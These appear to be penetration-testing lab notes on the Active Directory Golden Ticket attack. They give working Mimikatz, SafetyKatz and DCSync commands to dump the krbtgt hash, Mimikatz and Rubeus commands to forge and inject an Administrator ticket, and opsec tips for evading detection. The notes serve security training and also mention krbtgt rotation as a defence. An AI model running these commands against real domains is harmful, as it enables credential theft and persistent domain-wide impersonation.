- Try not to use it in real engagement. Only use it to check for detection or to push boundaries.
- Need Domain admin priv for this attack
- A golden ticket is signed and encrypted by the hash of the krbtgt account which makes it a valid TGT ticket. 
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine. 
-  As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
- Execute mimikatz (or a variant) on DC as DA to get krbtgt hash 
```
Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’ -Computername dcorp-dc 
```
```
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"' 
```
(this is noisy)

-  To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object): 
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
```
- Using the DCSync option needs no code execution on the target DC
- Use active domain user
- Run the below command to create a Golden ticket on any machine that has network connectivity with DC
```
C:\AD\Tools\BetterSafetykatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
### Persistence - Golden Ticket - Rubeus
- Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
```
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```
- Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
	- To retrieve flags for user specified in /user.
	- To retrieve /groups, /pgid, /minpassage and /maxpassage
	- To retrieve /netbios of the current domain
- If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).
- The Golden ticket forging command looks like this:
```
C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```